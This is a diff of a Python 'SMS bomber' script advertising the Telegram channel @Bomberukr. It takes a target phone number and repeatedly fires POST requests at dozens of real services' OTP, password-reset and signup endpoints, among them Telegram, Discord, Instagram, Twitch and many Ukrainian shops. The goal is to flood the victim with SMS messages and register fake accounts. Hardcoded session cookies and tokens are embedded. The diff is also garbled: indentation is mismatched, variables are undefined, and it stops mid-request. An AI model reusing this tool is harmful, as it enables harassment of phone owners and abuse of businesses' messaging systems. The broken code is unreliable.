@@ -9,21 +9,14 @@ console = Console()
 os.system('cls' if os.name == 'nt' else 'clear')
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 def generate_info():
-    global _name
-    global _email
-    global password
-    global username
-    global junker_phone
-    _name = ''
-    password = ''
-    username = ''
-    for x in range(12):
-        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-    _email = _name + '@gmail.com'
-    email = _email
-    phone_plus = "+" + number
+        _phoneNEW=phone[3:]
+        _phone = phone
+        _phone9 = _phone[1:]
+        _phonePozichka = '+'+_phone[0:2]+'-'+_phone[2:5]+'-'+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12] #38-050-669-16-10'
+        _phoneQ = '+'+_phone[0:2]+'('+_phone[2:5]+') '+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12] # +38(050) 669 16 10
+        _phoneCitrus = '+'+_phone[0:3]+' '+_phone[3:5]+'-'+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12]
+        _phoneComfy = '+'+_phone[0:2]+' ('+_phone[2:5]+') '+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12]
+        _phone88 = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+'-'+_phone[9:11]
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 console.print('''[blue]
  Telegram Channel - @Bomberukr
@@ -34,175 +27,686 @@ os.system('termux-open-url https://t.me/Bomberukr')
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 console.print('[red]Введите номер телефонa (без + ')
 
-number = console.input('[blue]Spavveri>>> ')
+phone = console.input('[blue]Spavveri>>> ')
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 run = int(console.input('[red]Введите количество повторов (1-10):\n[blue]Spavveri>>> '))
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 for _ in track(range(run)):
  headers = {"User-Agent": fake_useragent.UserAgent().random}
- try:#ok
-         requests.post('https://epicentrk.ua/api/person/v1/user/recoverypassword/sendrecoverycode/', data={'LANG_ID': 'ua','USER_LOGIN': '+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'p3p': 'policyref="/bitrix/p3p.xml", CP="NON DSP COR CUR ADM DEV PSA PSD OUR UNR BUS UNI COM NAV INT DEM STA"', 'strict-transport-security': 'max-age=15552000; includeSubDomains; preload', 'x-content-type-options': 'nosniff', 'x-frame-options': 'SAMEORIGIN', 'x-powered-by': 'PHP/7.4.25', 'x-powered-cms': 'Bitrix Site Manager (4bc356218be26e889085d220a9e786a6)', 'cookie': 'PHPSESSID=1t269iinndd7md5sqo8b7700ek; LANG=ua; LANG_SUBDOMAIN=ua; store-id=2; BITRIX_SM_LOCATION=def50200d1678734f41f460bcd67c0e7f652714c1d25112350930f045277c17c3fb7e18849564c70e87aff0cb6bdb7fb67ecb0f52d6c1f94ba2cd85eb71a663570f93e7c082af1b70d2dc0699c0fb92fbc1e91bb41207d55050bb0224e2049f81fb29a2b4d5d6a7539faad7f65c9ae4ecd446f2896174b6748a8b10ede7882533e4999299a0f81d0b443d6373f63abf0d4d77a0386c8a62ae62d4c5757efee8f1b9509531f037e80f3f36d177b52881abc9f9015eecb07a4cb6e96dc6dd1982b36c818a2c2204b33c9569da3b7dbc5cad5f5f533e9675802fe8eed5281c1395a5119240aa78011dbe5fb77c1d90995b614055cfeb2c5c0bd353151860c9c80f69d92e4459d62564c278acd490258744932689aaba880b2342988af8fce68527affbded359f5b8708c302a333dde73759c0fdf40a5ccc91180d1f372489007258c4daa195f06c65dcdde2dc4a2bfd9b840e1e70a8618cffeaff22df24bf4ddb740a4f1c303fa7c2c763c939fee7348d03aacd73f7fcfe6078a8497a90d143aa1d3fff2eb11a3e1e9e6fe984b7ae7737130645e4e8b9a37a482b36756a8c8f9210007219ddae33a4fe03dfc228771214786ad545a8f9609e470997effe16605c67292944fce82b5ead32856b755e854f0b23175b6e6a07f0a6a4909de9a0c9a27c4f622ebabeee2fbfc79e6767b8cfa5454ee04288b428606b2b7f8f06488379e59b7b82c84cc7637b8dee7dc4bdc66953e5c17943b028a0309ac2b808c27af7f7e48829e001815b729e95cc5e2e679e6b0597f506b32299651230a809f9831c19d0f8f60bf591323b85f09252505f23ded9779ec7a79b03835ae8cf22ce74933b69310979b3c2b51c630b9c2947e8b3bb6e37e8e86a7f11c97246a0e69f98d9f2b4119fd4f414817d14e88becaf74dec96c8fd19793f148465e34d5686192f8bec785f9769c68257a7d66e53c57959e910b52c72d62175c4ae80bb9807b88402ec75baea52fcb6798aaf0207652aefd32f398b61fe122141945a6728ad39266236784689291f53321c340e49cbfbbc848102bcd88adc3a1d6ccb5cf7e194077788dd8e29df092422a975a811e342476ef5ac9a6c666300f522bcf6efab10665930ca8cabcae0bf36bd79180f88e1faad119b77424df67ef529e4ff99c7d0f; BITRIX_SM_SALE_UID=923039850; __cf_bm=m.Ou9mYjkunw4v3prk5KThV3IsEiJ8jVbYutsIO8HQc-1635883869-0-AZdGHS57eMlrlhw5HODImuySQ6oD7owXlUEaV/ADBv28dDvqGGuJxLP5qXXIcIRcJqINHsgInJbBO9hIeRsCTUk=; _gcl_au=1.1.329786748.1635883887; epic_digital_sid=7889b9f5142983dee7f317fd460b3dc3; sc=8DC29604-D83A-CA43-1D7A-AEA55625A39A; BX_USER_ID=e9be5297d091d2b0a0648651770a6910; _gid=GA1.2.1712308472.1635883935; _hjid=367b87a5-a8e4-49df-9b28-e8bba9438837; _hjFirstSeen=1; _gaexp=GAX1.2.WlLos1ScS0WHGIPl3C-mtA.19018.x578; _dc_gtm_UA-69938460-2=1; _dc_gtm_UA-56814631-1=1; _dc_gtm_UA-69938460-1=1; _gat_UA-69938460-2=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=0; _ga_VC9M164SVX=GS1.1.1635883886.1.1.1635883963.43; _ga=GA1.2.437891472.1635883935', 'referer': 'https://epicentrk.ua/ua/personal/restore/?forgot_password=yes&backurl=%2Fua%2Fpersonal%2Flogin%2F', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
-         print('epicentrk.ua')
- except:
-         print('Не доставлена (epicentrk.ua)')
- try:#ok
-         requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": number}, headers=headers)
-         print('my.xtra.tv')
- except:
-         print('Не отправлено (my.xtra.tv)')
- try:#ok
-         requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers)
-         print('bi.ua')
- except:
-         print('Не отправлено (bi.ua)')
- try:#ok
-         requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers)
-         print('ctrs')
- except:
-         print('Не отправлено (ctrs)')
- try:#ok
-         requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
-         print('telegram')
- except:
-         print('Не отправлено (telegram)')
- try:#no
-         requests.post("https://u.icq.net/api/v70/rapi/auth/sendCoden", params={"phone": number, "devId": "ic1rtwz1s1Hj1O0r"}, headers=headers)
-         print('icq')
- except:
-        print('Не отправлено (icq)')
- try:#ok/no
-         requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers)
-         print('discord')
- except:
-         print('Не отправлено (discord)')
- try:#ok
-         requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
-         print('vodafone')
- except:
-         print('Не отправлено (vodafone)')
- try:#ok
-         requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers)
-         print('megasport')
- except:
-         print('Не отправлено (megasport)')
- try:#ok
-         requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, headers=headers)
-         print('zolotakoroleva.ua')
- except:
-         print('Не отправлено (zolotakoroleva.ua)')
- try:#ok
-         requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers)
-         print('mozayka.com.ua')
- except:
-         print('Не отправлено (mozayka.com.ua)')
- try:#ok
-         requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers)
-         print('kazan-divan.eatery.club')
- except:
-         print('Не доставлено (kazan-divan.eatery.club)')
- try:#ok
-         requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers)
-         print('groshivsim.com')
- except:
-         print('Не отправлено (groshivsim.com)')
- try:#ok
-         requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers)
-         print('money4you.ua')
- except:
-         print('Не отправлено (money4you.ua)')
- try:
-         requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username': number}, headers={'accept-encoding':'gzip, deflate, br', 'accept-language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7','content-type':'application/x-www-form-urlencoded', 'cookie':'ig_did=06389D42-D5BA-42C2-BCA6-49C2913D682B; csrftoken=SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL; mid=XyIqeAALAAF1N7j0GbPCNuWhznuX; rur=FRC; urlgen="{\"109.252.48.249\": 25513\054 \"109.252.48.225\": 25513}:1k5JBz:E-7UgfDDLsdtlKvXiWBUphtFMdw"','referer':'https://www.instagram.com/accounts/password/reset/', 'origin':'https://www.instagram.com','user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95 (Edition Yx)','x-csrftoken':'SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL', 'x-ig-app-id':'936619743392459','x-instagram-ajax': 'a9aec8fa634f', 'x-requested-with': 'XMLHttpRequest'})
-         print('instagram.com')
- except:
-         print('Не отправлено (instagram.com)')
- try:
-         requests.post('https://cabinet.taximaxim.ru/Services/Public.svc/api/v2/login/code/droppedcall/send?device=Xiaomi%2FMi+9T+Pro%2F10&locale=uk&source=playmarket&city=297&udid=ef94a46599d0e604&version=3.12.20&density=xxhdpi&platform=CLAPP_ANDROID&latitude=48.2552685&radius=47.861&rt=154436.516&longitude=25.9334519&sig=1411965450e7f390089c2cfab52ef029', json={'locale': 'uk','phone': number,'type':'droppedcall','smstoken':'vEMdSjfFO6R','isDefault':'1','mcc':'255'}, headers={'X-Requested-With':'XMLHttpRequest', 'Accept-Charset':'UTF-8', 'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 10; Mi 9T Pro MIUI/V12.0.6.0.QFKMIXM)', 'X-Client-RequestTimeout':'10', 'Dark-Theme':'false', 'Url-Scheme':'maximzakaz', 'Connection':'Connection', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'DNT':'1'})
-         print('cabinet.taximaxim.ru')
- except:
-         print('Не отправлено (cabinet.taximaxim.ru)')
- try:
-         requests.post('https://md-fashion.com.ua/bpm/validate-contact', data={'phone': '+' + number}, headers=headers)
-         print('md-fashion.com.ua')
- except:
-         print('Не отправлено (md-fashion.com.ua)')
- try:#numberis
-         requests.post('https://be.budusushi.ua/login', data={'LoginForm[username]': phone[2:]}, headers={'X-Requested-With':'XMLHttpRequest', 'cookie': 'PHPSESSID=ql5hs8fs8bounfjnbehgrncrel; _gcl_au=1.1.1732122179.1637071555; _ga=GA1.2.781960988.1637071555; _gid=GA1.2.978787047.1637071555; _gat_UA-106901939-3=1', 'referer': 'https://budusushi.ua/', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36', 'DNT':'1'})
-         print('be.budusushi.ua')
- except:
-         print('Не отправлено (be.budusushi.ua)')
- try:
-         requests.post('https://dnipro-m.ua/uk/phone-verification/', data={'phone': number}, headers={'X-Requested-With':'XMLHttpRequest', 'x-xss-protection': '1; mode=block', 'cookie': 'PHPSESSID=mjgof64ae33gd9g4rpto23utbs; session_hash=ecf0f036b9519cd8eae6640d1cb07bc2; gclid=939156d81035356c746423ecca0a2cf4a2748f879bd3dc65cfa6250fb7064ccea%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22gclid%22%3Bi%3A1%3Bs%3A8%3A%22dnipro-m%22%3B%7D; language=0480298520a8be04ccfd813520616a13a8aa0fb2db683a1126b77f187eca16c3a%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22language%22%3Bi%3A1%3Bs%3A2%3A%22uk%22%3B%7D; translations_pushed=92f83c1f3a434aeae744854c974cdb236df315cbe39e518ed7234b1ea9a0cd88a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22translations_pushed%22%3Bi%3A1%3Bi%3A1%3B%7D; _csrf-frontend=bef2130445b5ccea33c7703f35273eab653c9ac5572def7b93a0fb02b25a556ca%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22SqzDL32pQojiQqc2Y50FzsdgD6Pmq8ma%22%3B%7D; _gcl_au=1.1.271637781.1635439209; _gcl_aw=GCL.1635439211.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB; ab_1=2; _gid=GA1.2.377104572.1635439214; _dc_gtm_UA-87493814-1=1; _hjid=1ba8c8eb-f5de-4eb6-b07d-54a7b2e30c70; _hjFirstSeen=1; sc=C91E5BF3-A5C7-774E-FA5A-76E87C65E828; _gat_UA-87493814-1=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=0; _ga_1QMTESJ6M0=GS1.1.1635439214.1.0.1635439215.59; _ga=GA1.2.2011064152.1635439214; __zlcmid=16mkRHVrtBTC1Fc; _gac_UA-87493814-1=1.1635439240.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'referer': 'https://dnipro-m.ua/uk/?gclid=Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'x-csrf-token': 'koW-Ul6Vmcd9-M963uo7FTOT3bZQyePOrFDxs4Si7S3B9MQWEqartyyXpROPm1gnaqbt8Cq6h6noZqHe9ZqATA==', 'x-requested-with': 'XMLHttpRequest', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
-         print('dnipro-m.ua')
- except:
-         print('Не отправлено (dnipro-m.ua)')
- try:
-         requests.post('https://rider.uklon.com.ua/api/v1/phone/send-code', json={'username':'+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-correlation-id': 'c3208fdf-4dd7-4bca-aa84-2c686c1e2f60', 'sentry-trace': '796731cc91f54825a3e0435bebc67587-a104fb30d8b1adfc-1', 'uklon-agent': 'UklonPwa/1.16.0.182484', 'referer': 'https://m.uklon.com.ua/', 'locale': 'uk', 'client_id': '04F2BB99734848E1A061140A7452D1A9', 'app_uid': '9e33ffae-0ffd-4361-8bed-869b9ec94cb1', 'city': 'kyiv', 'cf-ray': '6a7f973a9ac12319-KBP', 'content-length': '0', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
-         print('uklon.com.ua')
- except:
-         print('Не отправлено (uklon.com.ua)')
- try:
-         requests.post('https://ucb.z.apteka24.ua/api/send/otp', json={'phone':number}, headers={'X-Requested-With':'XMLHttpRequest', 'link': '<https://ucb.z.apteka24.ua/api/docs.jsonld>; rel="http://www.w3.org/ns/hydra/core#apiDocumentation"', 'server': 'nginx/1.17.10', 'vary': 'Accept', 'x-content-type-options': 'nosniff', 'x-frame-options': 'deny', 'x-powered-by': 'PHP/7.4.21', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache, private', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
-         print('apteka24.ua')
- except:
-         print('Не отправлено (apteka24.ua)')
- try:
-         requests.post('https://anc.ua/authorization/auth/v2/register', json={'login':'+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'server': 'cloudflare', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-content-type-options': 'nosniff', 'x-frame-options': 'DENY', 'x-xss-protection': '1; mode=block' , 'cookie': 'i18n_redirected=ru; sc=78E5A248-BB67-8529-17FB-C576B2F0C2C6; _gid=GA1.2.932161565.1636350376; _ga=GA1.2.323331122.1636350376; _gcl_au=1.1.1182428524.1636350380; _hjid=b16352a7-11da-4f6f-964a-b39c79b0686e; _hjFirstSeen=1; _hjAbsoluteSessionInProgress=0; _clck=1sxn18j|1|ew9|0; _clsk=oley8v|1636350383248|1|1|e.clarity.ms/collect; _ga_36VHWFTBMP=GS1.1.1636350372.1.1.1636350470.60; _dc_gtm_UA-169190421-1=1', 'referer': 'https://anc.ua/ru', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache, no-store, max-age=0, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
-         print('anc.ua')
- except:
-         print('Не отправлено (anc.ua)')
- try:#numberis
-         requests.post('https://cscapp.vodafone.ua/eai_smob/start.swe?SWEExtSource=JSONConverter&SWEExtCmd=Execute', json={'params':{'version':'2.1.2','language':'ua','source':'WebApp','token':'null','manufacture':'','childNumber':'','accessType':'','spinner':'1'},'requests':{'loginV2':{'id':phone[3:]}}}, headers={'X-Requested-With':'XMLHttpRequest', 'SWEExtSource': 'JSONConverter', 'SWEExtCmd': 'Execute', 'vary': 'Accept-Encoding', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
-         print('cscapp.vodafone.ua')
- except:
-         print('Не отправлено (cscapp.vodafone.ua)')
- try:#numberis
-         requests.post('https://bilshe.mastercard.ua/app/api/check-signup-phone', json={'phone':phone[2:],'password':'#6ujKK%%AfsXkey1','confirmPassword':'#6ujKK%%AfsXkey1'}, headers={'X-Requested-With':'XMLHttpRequest', 'X-XSS-Protection': '1; mode=block', 'Cookie': 'cookiesession1=678B28B9XYZABCDEFGHIJKMNOPQR31C6; OptanonAlertBoxClosed=2021-10-28T18:41:50.742Z; OptanonConsent=isIABGlobal=false&datestamp=Thu+Oct+28+2021+21%3A41%3A50+GMT%2B0300+(%D0%B7%D0%B0+%D1%81%D1%85%D1%96%D0%B4%D0%BD%D0%BE%D1%94%D0%B2%D1%80%D0%BE%D0%BF%D0%B5%D0%B9%D1%81%D1%8C%D0%BA%D0%B8%D0%BC+%D0%BB%D1%96%D1%82%D0%BD%D1%96%D0%BC+%D1%87%D0%B0%D1%81%D0%BE%D0%BC)&version=6.10.0&consentId=c931c9d0-2e56-4fd0-8406-75335c3441e6&interactionCount=1&landingPath=NotLandingPage&groups=C015%3A1%2CC016%3A1%2CC0001%3A1%2CC006%3A1%2CC0002%3A1&hosts=H144%3A1%2CH244%3A1%2CH245%3A1%2CH247%3A1; AMCVS_919F3704532951060A490D44%40AdobeOrg=1; AMCV_919F3704532951060A490D44%40AdobeOrg=-1124106680%7CMCMID%7C19357445073970705823786156474307046252%7CMCAAMLH-1636051311%7C6%7CMCAAMB-1636051311%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1635453711s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C5.2.0; s_vnum=1666982511413%26vn%3D1; s_invisit=true; gpv_pn=no%20value; s_cc=true; s_nr=1635446557193-New; s_sq=masterc601%3D%2526c.%2526a.%2526activitymap.%2526page%253Dhttps%25253A%25252F%25252Fbilshe.mastercard.ua%25252F%2526link%253D%2525D0%25259F%2525D0%2525A0%2525D0%25259E%2525D0%252594%2525D0%25259E%2525D0%252592%2525D0%252596%2525D0%252598%2525D0%2525A2%2525D0%252598%2526region%253Droot%2526.activitymap%2526.a%2526.c%2526pid%253Dhttps%25253A%25252F%25252Fbilshe.mastercard.ua%25252F%2526oid%253D%2525D0%25259F%2525D0%2525A0%2525D0%25259E%2525D0%252594%2525D0%25259E%2525D0%252592%2525D0%252596%2525D0%252598%2525D0%2525A2%2525D0%252598%2526oidt%253D3%2526ot%253DSUBMIT', 'Referer': 'https://bilshe.mastercard.ua/signup', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control': 'no-cache, private', 'Cache-Control': 'max-age=31536000', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
-         print('bilshe.mastercard.ua')
- except:
-         print('Не отправлено (bilshe.mastercard.ua)')
- try:
-         requests.post('https://cabinet.skarb.com.ua/user/register', data={'_csrf': 'mG9Ke7hr_W-jNPBrIONmoYcy4_yhohb65oCkznNj2RruKnw13wWJG-htyAdkmwH3wEW2xcfjTMit5pGlKRXgLA==','login': '+' + number,'password': 'as23Afs312','subscribe': '0','subscribe': '1'}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=300;', 'cookie': 'PHPSESSID=9caf7faf4ea190ac1af68c81cf564e12; _csrf=bdcd3f1b1d4fcd9630fbccd675c6c621e778b9dc164ae0b824a47490bc77b251a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22vE6NgnttKY8lDxgVGwU9fAZ2Kf5kZv96%22%3B%7D; _hjid=ac40cfb3-3566-4f11-80e6-03fa308b762c; _hjFirstSeen=1; _ga=GA1.3.1320069702.1635787230; _gid=GA1.3.666518449.1635787230; _gat_UA-168694557-1=1; label_entry=ascbiiu; _hjAbsoluteSessionInProgress=0; carrotquest_device_guid=46f523f6-661a-40db-a58f-1f08a03ba975; carrotquest_uid=1037496607563582470; carrotquest_auth_token=user.1037496607563582470.20750-1fe4d375c930f1f6c1c80e0db5.5cd10bb1f419ffc0f8a08c1b206fffc14213b56ba506f318; carrotquest_realtime_services_transport=wss; carrotquest_session=iu41d6pco8da14aputbtp7l5snvrtc9l; carrotquest_session_started=1', 'referer': 'https://cabinet.skarb.com.ua/user/register', 'upgrade-insecure-requests': '1', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'max-age=0', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
-         print('cabinet.skarb.com.ua')
- except:
-         print('Не отправлено (cabinet.skarb.com.ua)')
- try:
-         requests.post('https://www.nl.ua/ua/personal/', data={'component': 'bxmaker.authuserphone.login','method': 'sendCode','phone': '+' + number,'registration': 'N'}, headers={'X-Requested-With':'XMLHttpRequest', 'cookie': 'PHPSESSID=87j12if7v9o5h0li1jq578fc84; BITRIX_SM_SALE_UID=f506434edf6959334514c71583fee9cf; cookiesession1=678A3E0DPQRSTUV0123456789834B123; _gid=GA1.2.633615997.1636801270; _gac_UA-12429852-1=1.1636801270.Cj0KCQiA4b2MBhD2ARIsAIrcB-SlOsPHMhWXxIZo4CNY8wplpmXy1hCO9iHF41lN13Pd5M6z_4NAGQ8aAidDEALw_wcB; _gat_gtag_UA_12429852_1=1; _gcl_aw=GCL.1636801270.Cj0KCQiA4b2MBhD2ARIsAIrcB-SlOsPHMhWXxIZo4CNY8wplpmXy1hCO9iHF41lN13Pd5M6z_4NAGQ8aAidDEALw_wcB; _gcl_au=1.1.915257014.1636801270; _ga_8ZPHLHGVS0=GS1.1.1636801269.1.1.1636801272.0; _ga=GA1.2.122356831.1636801270', 'referer': 'https://www.nl.ua/ua/personal/', 'referrer-policy': 'no-referrer-when-downgrade', 'server': 'nginx/1.20.1', 'strict-transport-security': 'max-age=31536000;', 'vary': 'Accept-Encoding,User-Agent', 'x-powered-by': 'PHP/5.6.40', 'x-powered-cms': 'Bitrix Site Manager (23046a56eefe26b07f835119ad2f8f24)', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate, post-check=0, pre-check=0', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36', 'DNT':'1'})
-         print('nl.ua')
- except:
-         print('Не отправлено (nl.ua)')
-#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
- try:
-     requests.post('https://api.telemed.care/oauth/verify_phone_number', json={"phone_number": number}, headers={'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.14.8'})
-     print('telemed.care')
- except:
-     print('Не доставлено (telemed.care)')
+         try:
+             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+             print('[@'+str(bot_username)+'] [+] ICQ отправлено!')
+         except:
+             print('[@'+str(bot_username)+'] [-] Не отправлено!')
+         try:
+             requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
+             print('[@'+str(bot_username)+'] [+] Twitch отправлено!')
+         except:
+             print('[@'+str(bot_username)+'] [-] Не отправлено!')
+         try:
+             requests.post("https://my.citrus.ua/api/v2/register", data={"email": email, "name": "Артем", "12phone": _phone, "password": password, "confirm_password": password})
+             print("[+] Регестрация на Citrus отправлена!")
+         except:
+             print('[@'+str(bot_username)+'] [-] не отправлено!')
 
- try:
-     requests.post('https://admin.topcredit.ua/api/sms/password-verification/create', json={"phone": number})
-     print('topcredit.ua')
- except:
-     print('Не доставлено (topcredit.ua)')
+         try:
+             requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus})
+             print("[+] Citrus отправлено!")
+         except:
+             print("[-] не отправлено!")
 
- try:
-     requests.post('https://chernovtsy.rabota.ru/api-web/v6/code/send.json', json={'request':{'login':"+" + number},'request_id':'90560914','application_id':'13','rabota_ru_id':'616b0c9f211248003394866342942900','user_tags':[{'id':'0','add_date':'2021-10-16','name':'main_page_carees_story_control2'},{'id':'0','add_date':'2021-10-16','name':'careers_main_page_widget_target'},{'id':'0','add_date':'2021-10-16','name':'hr_banners_show'},{'id':'0','add_date':'2021-10-16','name':'hr_login_form_spa'},{'id':'0','add_date':'2021-10-16','name':'vacancy_split_view_careers_widget_target'},{'id':'0','add_date':'2021-10-16','name':'courses_widget_control2'},{'id':'0','add_date':'2021-10-16','name':'usp_company_review_form_target'},{'id':'0','add_date':'2021-10-16','name':'profession_widget_control2'},{'id':'0','add_date':'2021-10-16','name':'web_snippetclick2_control1'},{'id':'0','add_date':'2021-10-16','name':'hr_new_scheduled_action_list_active'},{'id':'0','add_date':'2021-10-25','name':'main_page_careers_story2_control2'}]}, 